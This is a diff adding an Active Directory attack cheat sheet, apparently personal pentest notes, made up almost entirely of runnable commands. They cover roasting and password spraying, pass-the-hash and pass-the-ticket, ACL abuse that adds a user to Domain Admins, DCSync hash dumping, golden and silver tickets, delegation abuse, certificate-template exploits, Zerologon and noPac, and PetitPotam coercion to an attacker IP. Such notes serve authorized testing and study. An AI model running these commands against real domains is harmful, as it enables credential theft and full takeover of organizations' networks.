@@ -1,0 +1,166 @@
+RECON / ENUM FIRST
+bash# crackmapexec
+crackmapexec smb target --gen-relay-list hosts.txt
+crackmapexec smb target -u '' -p ''
+crackmapexec smb target -u user -p pass --users
+crackmapexec smb target -u user -p pass --groups
+crackmapexec smb target -u user -p pass --shares
+crackmapexec smb target -u user -p pass --pass-pol
+
+# bloodhound (map entire AD)
+bloodhound-python -u user -p pass -d domain.com -ns DC_IP -c All
+# load JSONs into bloodhound GUI
+# queries: shortest path to DA, kerberoastable users, AS-REP roastable
+
+# ldapdomaindump
+ldapdomaindump ldap://DC_IP -u 'domain\user' -p pass -o ./ldap_out
+
+# enum4linux-ng
+enum4linux-ng -A DC_IP
+
+UNAUTHENTICATED ATTACKS
+bash# AS-REP Roasting (no creds needed, no preauth users)
+impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip DC_IP -no-pass
+impacket-GetNPUsers domain.com/ -dc-ip DC_IP -request    # auto find
+hashcat -m 18200 asrep.txt rockyou.txt
+john --wordlist=rockyou.txt asrep.txt
+
+# Anonymous LDAP dump
+ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"
+
+# PetitPotam unauthenticated (patch dependent)
+python3 PetitPotam.py -u '' -p '' YOURIP DC_IP
+
+WITH CREDS — LATERAL MOVEMENT
+bash# Kerberoasting
+impacket-GetUserSPNs domain.com/user:pass -dc-ip DC_IP -request
+hashcat -m 13100 kerb.txt rockyou.txt
+john --wordlist=rockyou.txt kerb.txt
+
+# Password spray (careful — lockout policy)
+crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
+crackmapexec smb DC_IP -u users.txt -p 'Season2024!' --continue-on-success
+kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Password123'
+
+# Find local admin access across network
+crackmapexec smb subnet/24 -u user -p pass --local-auth
+crackmapexec smb subnet/24 -u user -p pass
+
+PASS THE HASH / TICKET
+bash# Pass the Hash
+crackmapexec smb target -u admin -H :NTLM_HASH
+impacket-psexec -hashes :NTLM_HASH admin@target
+impacket-wmiexec -hashes :NTLM_HASH admin@target
+evil-winrm -i target -u admin -H NTLM_HASH
+
+# Pass the Ticket
+impacket-getTGT domain.com/user:pass -dc-ip DC_IP
+export KRB5CCNAME=user.ccache
+impacket-psexec -k -no-pass domain.com/user@target
+
+# Overpass the Hash (NTLM → TGT)
+impacket-getTGT domain.com/user -hashes :NTLM_HASH -dc-ip DC_IP
+export KRB5CCNAME=user.ccache
+impacket-wmiexec -k -no-pass domain.com/admin@DC_IP
+
+
+ACL / DACL ABUSE
+bash# Find ACL paths in Bloodhound:
+# GenericAll / GenericWrite / WriteOwner / WriteDACL / ForceChangePassword
+
+# ForceChangePassword
+net rpc password targetuser 'NewPass123!' -U domain/user%pass -S DC_IP
+
+# GenericWrite → targeted Kerberoasting
+impacket-targetedKerberoast -u user -p pass -d domain.com --dc-ip DC_IP
+
+# GenericAll on user → change password
+bloodyAD -u user -p pass -d domain.com --host DC_IP set password targetuser 'NewPass123!'
+
+# WriteDACL → give yourself DCSync rights
+impacket-dacledit -action write -rights DCSync -principal user -target-dn "DC=domain,DC=com" domain.com/user:pass -dc-ip DC_IP
+
+# GenericAll on group → add yourself
+net rpc group addmem "Domain Admins" user -U domain/user%pass -S DC_IP
+bloodyAD -u user -p pass -d domain.com --host DC_IP add groupMember "Domain Admins" us
+
+DCSYNC (dump all hashes)
+bash# Need DCSync rights (DA / replication perms)
+impacket-secretsdump domain/user:pass@DC_IP -just-dc
+impacket-secretsdump domain/user:pass@DC_IP -just-dc-user krbtgt
+impacket-secretsdump -hashes :NTLM_HASH domain/admin@DC_IP -just-dc
+
+# crackmapexec
+crackmapexec smb DC_IP -u admin -p pass --ntds
+
+GOLDEN / SILVER TICKET
+bash# Golden Ticket (need krbtgt hash from DCSync)
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX -domain domain.com Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain.com/Administrator@DC_IP
+
+# Silver Ticket (need machine account hash)
+impacket-ticketer -nthash MACHINE_HASH -domain-sid S-1-5-21-XXXX -domain domain.com -spn cifs/target.domain.com Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain.com/Administrator@target
+
+DELEGATION ATTACKS
+bash# Find delegation
+crackmapexec ldap DC_IP -u user -p pass --trusted-for-delegation
+impacket-findDelegation domain.com/user:pass -dc-ip DC_IP
+
+# Unconstrained delegation → coerce DC auth → get TGT
+# Run on box with unconstrained delegation:
+Rubeus.exe monitor /interval:5
+# Trigger coercion from attacker:
+python3 PetitPotam.py DELEGATED_HOST_IP DC_IP
+# Extract TGT from Rubeus output then PTT
+
+# Constrained delegation → S4U2Proxy
+impacket-getST -spn cifs/DC.domain.com -impersonate Administrator domain.com/svcaccount:pass -dc-ip DC_IP
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain.com/Administrator@DC.domain.com
+
+# RBCD (Resource Based Constrained Delegation)
+# If you have WriteProperty/GenericWrite on machine account
+impacket-addcomputer domain.com/user:pass -dc-ip DC_IP -computer-name FAKE$ -computer-pass 'FakePass123!'
+impacket-rbcd -action write -delegate-to TARGET$ -delegate-from FAKE$ domain.com/user:pass -dc-ip DC_IP
+impacket-getST -spn cifs/target.domain.com -impersonate Administrator domain.com/FAKE$:FakePass123! -dc-ip DC_IP
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain.com/Administrator@target.domain.com
+
+
+AD CS (CERTIFICATE ATTACKS)
+bash# Enum vulnerable templates
+certipy find -u user@domain.com -p pass -dc-ip DC_IP
+certipy find -u user@domain.com -p pass -dc-ip DC_IP -vulnerable -stdout
+
+# ESC1 (enroll + SAN)
+certipy req -u user@domain.com -p pass -dc-ip DC_IP -target CA_HOST -ca CA_NAME -template VULN_TEMPLATE -upn administrator@domain.com
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+# Get NTLM hash → PTH
+
+# ESC8 (NTLM relay to AD CS HTTP)
+certipy relay -target http://CA_HOST/certsrv/certfnsh.asp -template DomainController
+python3 PetitPotam.py YOURIP DC_IP
+certipy auth -pfx dc.pfx -dc-ip DC_IP
+
+ZEROLOGON / SAMNTHE ADMIN
+bash# Zerologon (CVE-2020-1472)
+python3 zerologon_tester.py DC_NETBIOS DC_IP
+python3 cve-2020-1472-exploit.py DC_NETBIOS DC_IP
+impacket-secretsdump -just-dc -no-pass DC_NETBIOS\$@DC_IP
+
+# NoPac (CVE-2021-42278/42287)
+python3 noPac.py domain.com/user:pass -dc-ip DC_IP -dc-host DC_HOST -shell
+python3 noPac.py domain.com/user:pass -dc-ip DC_IP --impersonate administrator -dump
+
+QUICK WIN CHECKLIST
+bash# Always run these first
+crackmapexec smb DC_IP -u '' -p ''               # null
+crackmapexec smb DC_IP -u 'guest' -p ''          # guest
+impacket-GetNPUsers domain.com/ -dc-ip DC_IP -request  # AS-REP no creds
+impacket-rpcdump DC_IP | grep -i "MS-RPRN"       # printnightmare
+certipy find -u user@domain.com -p pass -dc-ip DC_IP -vulnerable  # AD CS
+python3 PetitPotam.py -u '' -p '' YOURIP DC_IP   # unauthenticated coerce
+impacket-secretsdump domain/user:pass@DC_IP -just-dc  # if DA
